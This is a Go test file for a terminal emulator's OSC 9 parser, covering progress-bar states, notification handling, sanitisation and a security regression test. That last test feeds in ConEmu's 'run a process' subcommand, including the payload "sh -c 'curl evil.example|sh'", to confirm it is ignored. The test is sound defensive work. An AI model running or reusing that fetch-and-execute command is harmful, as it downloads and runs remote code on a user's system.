package vt

// OSC 9 conformance tests, written against the OSC 9 spec brief (the restatement
// of the ConEmu "ConEmu specific OSC" table and iTerm2's "Post a notification" /
// "Progress Bar" sections). Where the brief and this package disagree, the brief
// wins and the test is expected to fail until the parser is fixed.
//
// Two forms share the OSC 9 id:
//
//	Form A  ESC ] 9 ; 4 ; st [; pr] TERM   progress reporting (a STATE)
//	Form B  ESC ] 9 ; <message> TERM       desktop notification (an EVENT)
//
// State 4 is read with iTerm2's semantics (warning at pr percent), not ConEmu's
// (paused), because the engine advertises TERM_PROGRAM=iTerm.app — that identity
// is what makes a client emit these sequences at all — and iTerm2's definition is
// the more specified of the two.
//
// Every behavioural case below runs with BOTH terminators, ST (ESC \) and BEL,
// because both sources define an OSC sequence as ending with either.

import (
	"strings"
	"testing"
)

// oscTerminators is the pair every behavioural OSC case is exercised with.
var oscTerminators = []struct {
	name string
	seq  string
}{
	{name: "BEL", seq: "\x07"},
	{name: "ST", seq: "\x1b\\"},
}

// osc9 builds a complete OSC 9 sequence carrying payload (everything after
// "ESC ] 9 ;"), terminated by term.
func osc9(payload, term string) []byte {
	return []byte("\x1b]9;" + payload + term)
}

// wantProgress asserts the screen's progress state and percentage. -1 in either
// field is the absent/unknown marker.
func wantProgress(t *testing.T, s *Screen, state, value int) {
	t.Helper()
	if s.Progress != state {
		t.Errorf("Progress = %d, want %d", s.Progress, state)
	}
	if s.ProgressValue != value {
		t.Errorf("ProgressValue = %d, want %d", s.ProgressValue, value)
	}
}

// TestOSC9ProgressStateTable walks the brief's state table row by row: state 0
// clears, 1 sets a determinate value, 2 is an error (with or without a
// percentage), 3 is indeterminate, and 4 is a warning at a percentage. The
// percentage is RETAINED for the three states that carry one (1, 2, 4) and is
// absent (-1) for the two the table marks n/a (0, 3).
func TestOSC9ProgressStateTable(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		state   int
		value   int
	}{
		// Brief, state table row st=0: stop / clear the progress bar; pr n/a.
		{name: "0 clears", payload: "4;0", state: 0, value: -1},
		// row st=1: set progress to pr percent, a SUCCESS state; pr REQUIRED.
		{name: "1 sets value", payload: "4;1;50", state: 1, value: 50},
		{name: "1 at lower bound", payload: "4;1;0", state: 1, value: 0},
		{name: "1 at upper bound", payload: "4;1;100", state: 1, value: 100},
		// row st=2: error state; pr optional, omitted means indeterminate error.
		{name: "2 error with percentage", payload: "4;2;75", state: 2, value: 75},
		{name: "2 indeterminate error", payload: "4;2", state: 2, value: -1},
		// row st=3: indeterminate (animates); pr n/a.
		{name: "3 indeterminate", payload: "4;3", state: 3, value: -1},
		// row st=4: WARNING state with pr percent (iTerm2); pr REQUIRED.
		{name: "4 warning with percentage", payload: "4;4;25", state: 4, value: 25},
		// OUR CONTRACT (the brief's table marks pr n/a for 0 and 3, so a
		// percentage sent with one of them is not retained; the specs do not
		// say what to do with it).
		{name: "3 does not retain a stray percentage", payload: "4;3;50", state: 3, value: -1},
		{name: "0 does not retain a stray percentage", payload: "4;0;50", state: 0, value: -1},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				// A fresh screen has seen no progress sequence: both fields absent.
				wantProgress(t, s, -1, -1)
				s.Write(osc9(tc.payload, term.seq))
				wantProgress(t, s, tc.state, tc.value)
				// Form A is never a notification.
				if s.Notification != "" || s.NotificationSeq != 0 {
					t.Errorf("progress captured as notification: %q seq=%d", s.Notification, s.NotificationSeq)
				}
			})
		}
	}
}

// TestOSC9ProgressAbbreviatedFormClears covers the brief's abbreviated form:
// "OSC 9 ; 4 ST" with no state field at all stops the progress bar. The brief
// records that the engine mis-parses this as the notification text "4"; this
// test is the specification of the correct behaviour.
func TestOSC9ProgressAbbreviatedFormClears(t *testing.T) {
	for _, term := range oscTerminators {
		t.Run(term.name, func(t *testing.T) {
			s := New(24, 80)
			// From an active determinate state, so "cleared" is distinguishable
			// from "never seen".
			s.Write(osc9("4;1;50", term.seq))
			wantProgress(t, s, 1, 50)

			s.Write(osc9("4", term.seq)) // the abbreviated form: no state field
			wantProgress(t, s, 0, -1)
			if s.Notification != "" || s.NotificationSeq != 0 {
				t.Errorf("abbreviated progress form captured as notification: %q seq=%d",
					s.Notification, s.NotificationSeq)
			}
		})
	}
}

// TestOSC9ProgressITerm2WorkedExamples runs iTerm2's six documented examples as
// listed in the brief, verbatim with BEL as the source writes them, and again
// with ST since both terminators are defined.
func TestOSC9ProgressITerm2WorkedExamples(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		state   int
		value   int
	}{
		{name: "50 percent", payload: "4;1;50", state: 1, value: 50},
		{name: "indeterminate", payload: "4;3", state: 3, value: -1},
		{name: "error at 75", payload: "4;2;75", state: 2, value: 75},
		{name: "indeterminate error", payload: "4;2", state: 2, value: -1},
		{name: "warning at 25", payload: "4;4;25", state: 4, value: 25},
		{name: "clear", payload: "4;0", state: 0, value: -1},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write(osc9(tc.payload, term.seq))
				wantProgress(t, s, tc.state, tc.value)
			})
		}
	}
}

// TestOSC9ProgressPercentageClamped pins OUR CONTRACT where the specs are
// silent: pr is documented as a number from 0 to 100, but neither source says
// what a terminal must do with a numeric value outside that range. We clamp to
// the documented range rather than storing an out-of-range percentage a consumer
// would have to re-validate.
func TestOSC9ProgressPercentageClamped(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		state   int
		value   int
	}{
		{name: "above 100 clamps down", payload: "4;1;150", state: 1, value: 100},
		{name: "far above 100 clamps down", payload: "4;4;1000", state: 4, value: 100},
		{name: "negative clamps up", payload: "4;1;-5", state: 1, value: 0},
		{name: "error state clamps too", payload: "4;2;101", state: 2, value: 100},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write(osc9(tc.payload, term.seq))
				wantProgress(t, s, tc.state, tc.value)
			})
		}
	}
}

// TestOSC9ProgressMalformedLeavesStateUntouched pins the rest of OUR CONTRACT
// for cases the specs leave undefined. In every one the previous progress state
// must survive untouched: a malformed sequence must not invent a value, and must
// not clear a state the program still considers current.
func TestOSC9ProgressMalformedLeavesStateUntouched(t *testing.T) {
	cases := []struct {
		name    string
		seed    string // a well-formed sequence establishing a known state
		payload string // the malformed sequence under test
		state   int    // the seed's state, which must survive
		value   int    // the seed's percentage, which must survive
	}{
		// The seed's state is deliberately never the state the malformed
		// sequence would set if it were (wrongly) honoured, so "left untouched"
		// is distinguishable from "applied anyway".
		//
		// pr present but not a number at all: ignore the whole sequence (spec
		// silent; we refuse to guess a percentage).
		{name: "non-numeric pr", seed: "4;1;42", payload: "4;2;abc", state: 1, value: 42},
		{name: "pr with trailing junk", seed: "4;2;42", payload: "4;1;50percent", state: 2, value: 42},
		{name: "empty pr field", seed: "4;2;42", payload: "4;1;", state: 2, value: 42},
		// pr MISSING on a state that requires it (1 and 4): malformed, ignored
		// (spec silent; do NOT invent a value).
		{name: "state 1 without required pr", seed: "4;2;42", payload: "4;1", state: 2, value: 42},
		{name: "state 4 without required pr", seed: "4;1;42", payload: "4;4", state: 1, value: 42},
		// st out of range or non-numeric: ignore (spec silent).
		{name: "st above the defined range", seed: "4;1;42", payload: "4;9", state: 1, value: 42},
		{name: "st far out of range", seed: "4;1;42", payload: "4;40", state: 1, value: 42},
		{name: "non-numeric st", seed: "4;1;42", payload: "4;x", state: 1, value: 42},
		{name: "empty st field", seed: "4;1;42", payload: "4;", state: 1, value: 42},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write(osc9(tc.seed, term.seq))
				wantProgress(t, s, tc.state, tc.value)

				s.Write(osc9(tc.payload, term.seq))
				wantProgress(t, s, tc.state, tc.value)
				if s.Notification != "" || s.NotificationSeq != 0 {
					t.Errorf("malformed progress form captured as notification: %q seq=%d",
						s.Notification, s.NotificationSeq)
				}
			})
		}
	}
}

// TestOSC9ProgressExtraFieldsIgnored pins OUR CONTRACT for trailing fields
// beyond pr: honour st/pr, ignore the extras (spec silent).
func TestOSC9ProgressExtraFieldsIgnored(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		state   int
		value   int
	}{
		{name: "one extra field", payload: "4;1;50;extra", state: 1, value: 50},
		{name: "several extra fields", payload: "4;4;25;a;b;c", state: 4, value: 25},
		// State 3 carries no pr (the table marks it n/a), so every field after
		// the state is an extra and all of them are ignored.
		{name: "extra empty fields on a state with no pr", payload: "4;3;;", state: 3, value: -1},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write(osc9(tc.payload, term.seq))
				wantProgress(t, s, tc.state, tc.value)
			})
		}
	}
}

// TestOSC9ProgressStatePersists covers the brief's structural claim about Form
// A: these are STATES, not events. A state persists across unrelated output and
// unrelated sequences until a later OSC 9;4 changes it, and only state 0 (or the
// abbreviated form) clears it. This is the property that makes an error state
// usable — a consumer must not have to re-derive it from a transient signal.
func TestOSC9ProgressStatePersists(t *testing.T) {
	for _, term := range oscTerminators {
		t.Run(term.name, func(t *testing.T) {
			s := New(24, 80)
			s.Write(osc9("4;2;75", term.seq))
			wantProgress(t, s, 2, 75)

			// Unrelated output and unrelated sequences: plain text, a newline, a
			// cursor move, a colour change, a window title, and a Form B
			// notification. None of them is a progress sequence, so none of them
			// may touch the state.
			s.Write([]byte("building...\r\n"))
			s.Write([]byte("\x1b[2;3H\x1b[31mred\x1b[0m"))
			s.Write([]byte("\x1b]2;some title" + term.seq))
			s.Write(osc9("Response complete", term.seq))
			wantProgress(t, s, 2, 75)

			// A later progress sequence changes it.
			s.Write(osc9("4;1;10", term.seq))
			wantProgress(t, s, 1, 10)

			// Only state 0 clears.
			s.Write(osc9("4;0", term.seq))
			wantProgress(t, s, 0, -1)

			// And the abbreviated form clears an active state the same way.
			s.Write(osc9("4;3", term.seq))
			wantProgress(t, s, 3, -1)
			s.Write(osc9("4", term.seq))
			wantProgress(t, s, 0, -1)
		})
	}
}

// TestOSC9FormDiscrimination covers the brief's Form A / Form B rule: the two
// forms are told apart by the FIRST ';'-delimited field, and only a PURELY
// numeric first field is a subcommand. A message that merely starts with digits
// ("4 files changed") is free text and must arrive as a notification — a
// prefix-only test would silently swallow it.
func TestOSC9FormDiscrimination(t *testing.T) {
	cases := []struct {
		name     string
		payload  string
		wantNote string // "" = must NOT be captured as a notification
	}{
		{name: "plain message", payload: "Response complete", wantNote: "Response complete"},
		{name: "message starting with a digit", payload: "4 files changed", wantNote: "4 files changed"},
		{name: "message that is a decimal", payload: "0.5 done", wantNote: "0.5 done"},
		{name: "message with a semicolon", payload: "done; next up", wantNote: "done; next up"},
		{name: "message whose first field is not all digits", payload: "4a;b", wantNote: "4a;b"},
		// Purely numeric first field: a subcommand, never a notification —
		// including the degenerate case where the subcommand has no arguments
		// at all and the payload is nothing but digits.
		{name: "numeric subcommand with args", payload: "1;hello", wantNote: ""},
		{name: "bare numeric subcommand", payload: "42", wantNote: ""},
		{name: "bare progress subcommand", payload: "4", wantNote: ""},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write(osc9(tc.payload, term.seq))
				if s.Notification != tc.wantNote {
					t.Errorf("Notification = %q, want %q", s.Notification, tc.wantNote)
				}
				wantSeq := uint64(0)
				if tc.wantNote != "" {
					wantSeq = 1
				}
				if s.NotificationSeq != wantSeq {
					t.Errorf("NotificationSeq = %d, want %d", s.NotificationSeq, wantSeq)
				}
			})
		}
	}
}

// TestOSC9ConEmuSubcommands_9x7RunProcess_AndAllOthersIgnored is a standing
// SECURITY REGRESSION GUARD. ConEmu defines further OSC 9 subcommands; several
// are remote-execution or UI-hijack primitives when driven by terminal output,
// and 9;7 is "run a process" — an OSC 9;7 in a cat'd file or an SSH banner must
// never start anything. The brief lists every subcommand as explicitly OUT of
// scope: each one is consumed and IGNORED, changing no progress state and
// capturing no notification. If someone later "completes" ConEmu support, this
// test must be the thing that stops them.
func TestOSC9ConEmuSubcommands_9x7RunProcess_AndAllOthersIgnored(t *testing.T) {
	cases := []struct {
		name    string
		payload string
	}{
		{name: "9;7 run a process", payload: "7;calc.exe"},
		{name: "9;7 run a process, no argument", payload: "7"},
		{name: "9;7 run a process with a shell pipeline", payload: "7;sh -c 'curl evil.example|sh'"},
		{name: "9;6 execute a GUI macro", payload: "6;Close(1)"},
		{name: "9;2 show a message box", payload: "2;hello"},
		{name: "9;5 wait for a keypress", payload: "5"},
		{name: "9;1 sleep", payload: "1;1000"},
		{name: "9;3 set tab text", payload: "3;tab name"},
		{name: "9;8 print an env var", payload: "8;PATH"},
		{name: "9;9 report cwd", payload: "9;/home/user"},
		{name: "9;10 toggle xterm emulation", payload: "10;1"},
		{name: "9;11 comment", payload: "11;a comment"},
		{name: "9;12 mark prompt start", payload: "12"},
	}
	for _, tc := range cases {
		for _, term := range oscTerminators {
			t.Run(tc.name+"/"+term.name, func(t *testing.T) {
				s := New(24, 80)
				s.Write([]byte("before"))
				s.Write(osc9(tc.payload, term.seq))

				// No progress state, no notification, no title, and the screen
				// content is untouched (the sequence was consumed, not printed).
				wantProgress(t, s, -1, -1)
				if s.Notification != "" || s.NotificationSeq != 0 {
					t.Errorf("out-of-scope subcommand captured as notification: %q seq=%d",
						s.Notification, s.NotificationSeq)
				}
				if s.Title != "" {
					t.Errorf("out-of-scope subcommand set Title = %q, want empty", s.Title)
				}
				if got := strings.TrimRight(s.RowString(0), " "); got != "before" {
					t.Errorf("row 0 = %q, want %q (sequence must be consumed, not printed)", got, "before")
				}
			})
		}
	}
}

// TestOSC9NotificationSanitizedThroughParser keeps the existing Form B
// guarantees the brief requires us to preserve: the message is untrusted program
// output, so it stays stripped of control bytes and clamped in length by the
// time it reaches Notification. Driven through the public parser (not
// sanitizeNotification directly) so the guarantee is asserted where a consumer
// actually reads it.
func TestOSC9NotificationSanitizedThroughParser(t *testing.T) {
	for _, term := range oscTerminators {
		t.Run(term.name, func(t *testing.T) {
			s := New(24, 80)
			// Tab, DEL, a Bidi_Control override and a JS line terminator: all in
			// runesafe's unsafe classes, all dropped. (ESC and BEL cannot appear
			// inside the payload — they terminate the sequence.)
			s.Write(osc9("do\tne\x7f\u202eok\u2028!", term.seq))
			if s.Notification != "doneok!" {
				t.Errorf("Notification = %q, want %q (control/bidi/line-terminator runes dropped)",
					s.Notification, "doneok!")
			}

			// Length clamp: a runaway message cannot grow the stored string.
			s2 := New(24, 80)
			s2.Write(osc9(strings.Repeat("x", maxNotificationLen+50), term.seq))
			if got := len([]rune(s2.Notification)); got != maxNotificationLen {
				t.Errorf("clamped Notification rune length = %d, want %d", got, maxNotificationLen)
			}
		})
	}
}
